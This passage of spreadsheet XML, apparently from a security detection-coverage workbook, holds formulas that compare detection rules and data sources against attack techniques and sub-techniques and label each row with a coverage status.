        <f t="array" ref="H621">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I621" s="9" t="str" cm="1">
        <f t="array" ref="I621">IF(SUM(IF($C621=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C621=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J621" s="9" t="str" cm="1">
        <f t="array" ref="J62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21" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M621" s="9" cm="1">
        <f t="array" ref="M621">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N621" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O621" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P621" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S62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21" t="s">
        <v>861</v>
      </c>
      <c r="U621" t="s">
        <v>2834</v>
      </c>
      <c r="V621" t="s">
        <v>2835</v>
      </c>
      <c r="W621" t="b">
        <v>1</v>
      </c>
      <c r="X621" t="s">
        <v>2828</v>
      </c>
    </row>
    <row r="622" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A622" t="s">
        <v>2828</v>
      </c>
      <c r="B622" t="s">
        <v>2836</v>
      </c>
      <c r="C622" t="s">
        <v>2837</v>
      </c>
      <c r="D622" t="s">
        <v>10</v>
      </c>
      <c r="E622" t="s">
        <v>2829</v>
      </c>
      <c r="F622" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G622" s="9" cm="1">
        <f t="array" ref="G622">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H622" s="9" t="str" cm="1">
        <f t="array" ref="H622">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I622" s="9" t="str" cm="1">
        <f t="array" ref="I622">IF(SUM(IF($C622=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C622=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J622" s="9" t="str" cm="1">
        <f t="array" ref="J62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22" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M622" s="9" cm="1">
        <f t="array" ref="M622">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N622" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O622" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P622" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S62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22" t="s">
        <v>861</v>
      </c>
      <c r="U622" t="s">
        <v>2838</v>
      </c>
      <c r="V622" t="s">
        <v>2839</v>
      </c>
      <c r="W622" t="b">
        <v>1</v>
      </c>
      <c r="X622" t="s">
        <v>2828</v>
      </c>
    </row>
    <row r="623" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A623" t="s">
        <v>2840</v>
      </c>
      <c r="B623" t="s">
        <v>2840</v>
      </c>
      <c r="C623" t="s">
        <v>83</v>
      </c>
      <c r="D623" t="s">
        <v>7</v>
      </c>
      <c r="E623" t="s">
        <v>2841</v>
      </c>
      <c r="F623" s="9">
        <f t="shared" si="9"/>
        <v>3</v>
      </c>
      <c r="G623" s="9" cm="1">
        <f t="array" ref="G623">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H623" s="9" cm="1">
        <f t="array" ref="H623">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>2</v>
      </c>
      <c r="I623" s="9" t="str" cm="1">
        <f t="array" ref="I623">IF(SUM(IF($C623=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C623=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J623" s="9" cm="1">
        <f t="array" ref="J62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623" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>2</v>
      </c>
      <c r="M623" s="9" cm="1">
        <f t="array" ref="M623">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>2</v>
      </c>
      <c r="N623" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O623" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P623" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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23" t="s">
        <v>1010</v>
      </c>
      <c r="U623" t="s">
        <v>2842</v>
      </c>
      <c r="V623" t="s">
        <v>2843</v>
      </c>
      <c r="W623" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="624" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A624" t="s">
        <v>2840</v>
      </c>
      <c r="B624" t="s">
        <v>2844</v>
      </c>
      <c r="C624" t="s">
        <v>2845</v>
      </c>
      <c r="D624" t="s">
        <v>7</v>
      </c>
      <c r="E624" t="s">
        <v>2846</v>
      </c>
      <c r="F624" s="9">
        <f t="shared" si="9"/>
        <v>2</v>
      </c>
      <c r="G624" s="9" cm="1">
        <f t="array" ref="G624">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H624" s="9" t="str" cm="1">
        <f t="array" ref="H624">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I624" s="9" t="str" cm="1">
        <f t="array" ref="I624">IF(SUM(IF($C624=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C624=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J624" s="9" t="str" cm="1">
        <f t="array" ref="J62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24" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M624" s="9" cm="1">
        <f t="array" ref="M624">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N624" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O624" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P624" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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24" t="s">
        <v>1373</v>
      </c>
      <c r="U624" t="s">
        <v>2847</v>
      </c>
      <c r="V624" t="s">
        <v>2843</v>
      </c>
      <c r="W624" t="b">
        <v>1</v>
      </c>
      <c r="X624" t="s">
        <v>2840</v>
      </c>
    </row>
    <row r="625" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A625" t="s">
        <v>2840</v>
      </c>
      <c r="B625" t="s">
        <v>2848</v>
      </c>
      <c r="C625" t="s">
        <v>2849</v>
      </c>
      <c r="D625" t="s">
        <v>7</v>
      </c>
      <c r="E625" t="s">
        <v>2850</v>
      </c>
      <c r="F625" s="9">
        <f t="shared" si="9"/>
        <v>6</v>
      </c>
      <c r="G625" s="9" cm="1">
        <f t="array" ref="G625">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H625" s="9" t="str" cm="1">
        <f t="array" ref="H625">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I625" s="9" t="str" cm="1">
        <f t="array" ref="I625">IF(SUM(IF($C625=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C625=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J625" s="9" t="str" cm="1">
        <f t="array" ref="J62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25" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M625" s="9" cm="1">
        <f t="array" ref="M625">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N625" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O625" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P625" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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25" t="s">
        <v>2097</v>
      </c>
      <c r="U625" t="s">
        <v>2851</v>
      </c>
      <c r="V625" t="s">
        <v>2852</v>
      </c>
      <c r="W625" t="b">
        <v>1</v>
      </c>
      <c r="X625" t="s">
        <v>2840</v>
      </c>
    </row>
    <row r="626" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A626" t="s">
        <v>2853</v>
      </c>
      <c r="B626" t="s">
        <v>2853</v>
      </c>
      <c r="C626" t="s">
        <v>103</v>
      </c>
      <c r="D626" t="s">
        <v>1</v>
      </c>
      <c r="E626" t="s">
        <v>2540</v>
      </c>
      <c r="F626" s="9">
        <f t="shared" si="9"/>
        <v>1</v>
      </c>
      <c r="G626" s="9" cm="1">
        <f t="array" ref="G626">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H626" s="9" cm="1">
        <f t="array" ref="H626">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>6</v>
      </c>
      <c r="I626" s="9" t="str" cm="1">
        <f t="array" ref="I626">IF(SUM(IF($C626=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C626=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J626" s="9" cm="1">
        <f t="array" ref="J62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626" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>6</v>
      </c>
      <c r="M626" s="9" cm="1">
        <f t="array" ref="M626">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>6</v>
      </c>
      <c r="N626" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O626" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P626" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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26" t="s">
        <v>2513</v>
      </c>
      <c r="U626" t="s">
        <v>2854</v>
      </c>
      <c r="V626" t="s">
        <v>2855</v>
      </c>
      <c r="W626" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="627" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A627" t="s">
        <v>2853</v>
      </c>
      <c r="B627" t="s">
        <v>2856</v>
      </c>
      <c r="C627" t="s">
        <v>2857</v>
      </c>
      <c r="D627" t="s">
        <v>1</v>
      </c>
      <c r="E627" t="s">
        <v>2540</v>
      </c>
      <c r="F627" s="9">
        <f t="shared" ref="F627:F657" si="10">LEN(E627)-LEN(SUBSTITUTE(E627,",",""))+1</f>
        <v>1</v>
      </c>
      <c r="G627" s="9" cm="1">
        <f t="array" ref="G627">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H627" s="9" t="str" cm="1">
        <f t="array" ref="H627">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I627" s="9" t="str" cm="1">
        <f t="array" ref="I627">IF(SUM(IF($C627=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C627=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J627" s="9" t="str" cm="1">
        <f t="array" ref="J62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27" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M627" s="9" cm="1">
        <f t="array" ref="M627">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N627" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O627" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P627" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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27" t="s">
        <v>2513</v>
      </c>
      <c r="U627" t="s">
        <v>2858</v>
      </c>
      <c r="V627" t="s">
        <v>2859</v>
      </c>
      <c r="W627" t="b">
        <v>1</v>
      </c>
      <c r="X627" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="628" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A628" t="s">
        <v>2853</v>
      </c>
      <c r="B628" t="s">
        <v>2860</v>
      </c>
      <c r="C628" t="s">
        <v>2861</v>
      </c>
      <c r="D628" t="s">
        <v>1</v>
      </c>
      <c r="E628" t="s">
        <v>2540</v>
      </c>
      <c r="F628" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G628" s="9" cm="1">
        <f t="array" ref="G628">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H628" s="9" t="str" cm="1">
        <f t="array" ref="H628">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I628" s="9" t="str" cm="1">
        <f t="array" ref="I628">IF(SUM(IF($C628=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C628=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J628" s="9" t="str" cm="1">
        <f t="array" ref="J62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28" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M628" s="9" cm="1">
        <f t="array" ref="M628">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N628" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O628" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P628" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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28" t="s">
        <v>2513</v>
      </c>
      <c r="U628" t="s">
        <v>2862</v>
      </c>
      <c r="V628" t="s">
        <v>2863</v>
      </c>
      <c r="W628" t="b">
        <v>1</v>
      </c>
      <c r="X628" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="629" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A629" t="s">
        <v>2853</v>
      </c>
      <c r="B629" t="s">
        <v>2864</v>
      </c>
      <c r="C629" t="s">
        <v>2865</v>
      </c>
      <c r="D629" t="s">
        <v>1</v>
      </c>
      <c r="E629" t="s">
        <v>2540</v>
      </c>
      <c r="F629" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G629" s="9" cm="1">
        <f t="array" ref="G629">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H629" s="9" t="str" cm="1">
        <f t="array" ref="H629">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I629" s="9" t="str" cm="1">
        <f t="array" ref="I629">IF(SUM(IF($C629=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C629=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J629" s="9" t="str" cm="1">
        <f t="array" ref="J62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29" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M629" s="9" cm="1">
        <f t="array" ref="M629">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N629" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O629" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P629" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S62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29" t="s">
        <v>2513</v>
      </c>
      <c r="U629" t="s">
        <v>2866</v>
      </c>
      <c r="V629" t="s">
        <v>2867</v>
      </c>
      <c r="W629" t="b">
        <v>1</v>
      </c>
      <c r="X629" t="s">
        <v>2853</v>
      </c>
    </row>
    <row r="630" spans="1:24" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A630" t="s">
        <v>2853</v>
      </c>
      <c r="B630" t="s">
        <v>2868</v>
      </c>
      <c r="C630" t="s">
        <v>2869</v>
      </c>
      <c r="D630" t="s">
        <v>1</v>
      </c>
      <c r="E630" t="s">
        <v>2540</v>
      </c>
      <c r="F630" s="9">
        <f t="shared" si="10"/>
        <v>1</v>
      </c>
      <c r="G630" s="9" cm="1">
        <f t="array" ref="G630">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H630" s="9" t="str" cm="1">
        <f t="array" ref="H630">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I630" s="9" t="str" cm="1">
        <f t="array" ref="I630">IF(SUM(IF($C630=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C630=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J630" s="9" t="str" cm="1">
        <f t="array" ref="J63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30" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M630" s="9" cm="1">
